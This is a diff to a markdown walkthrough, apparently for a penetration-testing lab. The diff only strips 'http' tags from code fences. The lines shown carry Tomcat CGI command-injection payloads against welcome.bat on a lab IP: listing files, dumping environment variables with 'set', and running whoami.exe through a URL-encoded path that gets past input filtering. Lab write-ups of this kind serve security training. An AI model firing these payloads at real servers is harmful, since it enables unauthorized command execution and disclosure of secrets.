@@ -2169,7 +2169,7 @@ ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/F
 
 Access it:
 
-```http
+```
 http://10.129.204.227:8080/cgi/welcome.bat
 ```
 
@@ -2177,7 +2177,7 @@ http://10.129.204.227:8080/cgi/welcome.bat
 
 With a known `.bat` script (`welcome.bat`), inject commands:
 
-```http
+```
 http://10.129.204.227:8080/cgi/welcome.bat?&dir
 ```
 
@@ -2185,7 +2185,7 @@ http://10.129.204.227:8080/cgi/welcome.bat?&dir
 
 ## 📤 Retrieving Environment Variables
 
-```http
+```
 http://10.129.204.227:8080/cgi/welcome.bat?&set
 ```
 
@@ -2198,13 +2198,13 @@ http://10.129.204.227:8080/cgi/welcome.bat?&set
 
 Direct access fails due to Tomcat input filtering:
 
-```http
+```
 http://10.129.204.227:8080/cgi/welcome.bat?&c:\windows\system32\whoami.exe
 ```
 
 ### ✅ Solution: URL Encode Payload
 
-```http
+```
 http://10.129.204.227:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe
 ```
 
